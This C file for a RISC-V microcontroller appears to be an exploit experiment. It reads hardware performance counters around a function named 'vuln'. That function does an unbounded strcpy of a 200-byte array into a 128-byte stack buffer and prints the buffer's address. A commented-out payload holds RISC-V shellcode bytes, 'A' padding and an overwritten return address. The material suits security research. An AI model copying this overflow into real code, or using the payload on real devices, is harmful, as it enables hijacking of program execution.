#include <stdio.h>
#include <string.h>
#include <pmsis.h>

static uint32_t cycles_cnt = 0;
static uint32_t instr_cnt = 0;
static uint32_t active_cnt = 0;
static uint32_t imiss_cnt = 0;
static uint32_t jr_stall_cnt = 0;
static uint32_t jump_cnt = 0;
static uint32_t branch_cnt = 0;
static uint32_t btaken_cnt = 0;
static uint32_t rvc_cnt = 0;

void start_perf_counters() {
   
    pi_perf_conf(
        (1 << PI_PERF_CYCLES) | 
        (1 << PI_PERF_INSTR) | 
        (1 << PI_PERF_ACTIVE_CYCLES) | 
        (1 << PI_PERF_IMISS) | 
        (1 << PI_PERF_JR_STALL) | 
        (1 << PI_PERF_JUMP) | 
        (1 << PI_PERF_BRANCH) | 
        (1 << PI_PERF_BTAKEN) | 
        (1 << PI_PERF_RVC)
    );
    pi_perf_reset();   
    pi_perf_start();   
}

void stop_perf_counters() {

    pi_perf_stop();

    cycles_cnt = pi_perf_read(PI_PERF_CYCLES);
    instr_cnt = pi_perf_read(PI_PERF_INSTR);
    active_cnt = pi_perf_read(PI_PERF_ACTIVE_CYCLES);
    imiss_cnt = pi_perf_read(PI_PERF_IMISS);
    jr_stall_cnt = pi_perf_read(PI_PERF_JR_STALL);
    jump_cnt = pi_perf_read(PI_PERF_JUMP);
    branch_cnt = pi_perf_read(PI_PERF_BRANCH);
    btaken_cnt = pi_perf_read(PI_PERF_BTAKEN);
    rvc_cnt = pi_perf_read(PI_PERF_RVC);
}

void print_perf_counters() {
    printf("Performance Counters:\n");
    printf("Cycles: %lu\n", cycles_cnt);
    printf("Instructions: %lu\n", instr_cnt);
    printf("Active Cycles: %lu\n", active_cnt);
    printf("I-Cache Misses: %lu\n", imiss_cnt);
    printf("JR Stalls: %lu\n", jr_stall_cnt);
    printf("Jumps: %lu\n", jump_cnt);
    printf("Branches: %lu\n", branch_cnt);
    printf("Branches Taken: %lu\n", btaken_cnt);
    printf("RVC Instructions: %lu\n", rvc_cnt);

    if (instr_cnt > 0) {
        printf("CPI: %.2f\n", (float)cycles_cnt / instr_cnt); // Cycles Per Instruction
    }
}


void vuln() {
    char test[20];
    char buffer[128];
    char big_buffer[200] = "Hello";
    //char big_buffer[200] =  "\x01\x11"
    //                        "\x22\xce"
    //                        "\x13\x04\x21\x02"
    //                       "\x23\x25\x04\xfe"
    //                        "\x31\xa0"
    //                      "\x83\x27\xa4\xfe"
    //                        "\x85\x07"
    //                        "\x23\x25\xf4\xfe"
    //                        "\x03\x27\xa4\xfe"
    //                        "\xb7\xe7\xf5\x05"
    //                        "\x93\x87\xe7\x23"
    //                        "\xe3\xd5\xe7\xfe"
    //                        "\x81\x47"
    //                        "\x3e\x85"
    //                        "\x72\x44"
    //                        "\x05\x61"
    //                        "\xb7\x97\x01\x1c"
    //                        "\x93\x87\x47\xff"
    //                        "\x33\x48\x08\x01"
    //                        "\x05\x08"
    //                        "\x42\x08"
    //                        "\xb3\x87\x07\x41"
    //                        "\xe7\x80\x27\x02"
    //                        "AAAAAAAAAAAAAAAAAAAAAAAA"
    //                        "AAAAAAAAAAAAAAAAAAAAAAAA"
    //                        "AAAAAAAAAAAAAAAAAAAAAAAA"
    //                        "AAAAAAAAAAAAAAAA"
    //                        "\xec\x12\x00\x1c";
    
    strcpy(buffer, big_buffer);
    printf("Location of buffer: %p\n", buffer);

    printf("Input len: %d\n", strlen(buffer));
}

int main() {
    start_perf_counters();
    vuln();
    for (unsigned int i = 0; i < 100000894; i++) {
        // just looping
    }
    stop_perf_counters();                
    printf("Returned safely\n");
    print_perf_counters();
    return 0;
}
